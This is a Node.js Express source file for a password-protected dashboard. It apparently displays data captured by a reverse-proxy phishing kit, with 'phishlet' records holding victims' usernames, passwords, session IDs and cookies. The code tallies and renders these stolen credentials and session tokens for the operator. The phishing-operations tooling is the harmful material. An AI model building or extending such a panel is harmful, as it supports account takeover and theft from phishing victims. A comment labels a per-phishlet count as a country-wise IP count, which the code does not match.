if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config();
}

const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const users = require('./users');
const passport = require('passport');
const bcrypt = require('bcrypt');
const flash = require('express-flash');
const session = require('express-session');
const logger = require('morgan');
const axios = require('axios');

app.set('views', path.join(__dirname, 'views'));
app.use(express.static(__dirname + "/public/"));
app.set('view-engine', 'ejs');

app.use(logger('dev'));
app.use(express.urlencoded({extended: false}));

const initializePassport = require('./passport-config');
const {toJSON} = require("express-session/session/cookie");

initializePassport(
    passport,
    name => users.find(user => user.name === name),
    id => users.find(user => user.id === id)
);

app.use(express.json());
app.use(flash());
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false
}));

app.use(passport.initialize());
app.use(passport.session());

let countryCount = {};

app.get('/', checkAuthenticated, async (req, res) => {
    // Reset countryCount to start fresh on each request
    countryCount = {};

    await fs.readFile('data.db', 'UTF-8', (err, file) => {
        if (err) {
            console.log(err);
        } else {
            file = file.split("\n");
            const data = [];
            for (let i = 0; i < file.length; i++) {
                if (file[i].includes("{") || file[i].includes('"custom":{')) {
                    data.push(JSON.parse(file[i]));
                }
            }

            const validUsers = data.filter(user => user.username !== '' && user.username !== undefined);
            const validData = data.filter(user => user.username !== '' && user.password !== '' && user.useragent !== '');
            const validPassword = data.filter(user => user.password !== '' && user.password !== undefined);
            const invalidUserPass = data.filter(user => user.username !== '' && user.password !== '');
            const validSessions = data.filter(user => user.session_id !== '' && user.session_id !== undefined);
            const validCookies = data.filter(user => user.useragent !== '' && user.useragent !== undefined);

            //country wise ip count
            data.map(async item => {
                if (item.phishlet) {
                    const key = item.phishlet;
                    if (countryCount[key]) {
                        countryCount[key] += 1;
                    } else {
                        countryCount[key] = 1;
                    }
                }
            });

            res.render('index.ejs', {
                data: data,
                validUserCount: validUsers.length,
                validPasswordCount: validPassword.length,
                invalidUserPassCount: invalidUserPass.length,
                sessionCount: validSessions.length,
                cookieCount: validCookies.length,
                validUser: validData.length,
            });
        }
    });
});

app.get('/login', checkNotAuthenticated, (req, res) => {
    res.render('login.ejs');
});

app.post('/login', checkNotAuthenticated, passport.authenticate('local', {
    successRedirect: '/',
    failureRedirect: '/login',
    failureFlash: true
}));

function checkAuthenticated(req, res, next) {
    if (req.isAuthenticated()) {
        return next();
    }
    res.redirect('/login');
}

function checkNotAuthenticated(req, res, next) {
    if (req.isAuthenticated()) {
        return res.redirect('/');
    }
    next();
}

const PORT = 4000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server Running on Port ${PORT}...`);
});


// Route to get the current country count
app.get('/countryCount', (req, res) => {
    res.json(countryCount);
});
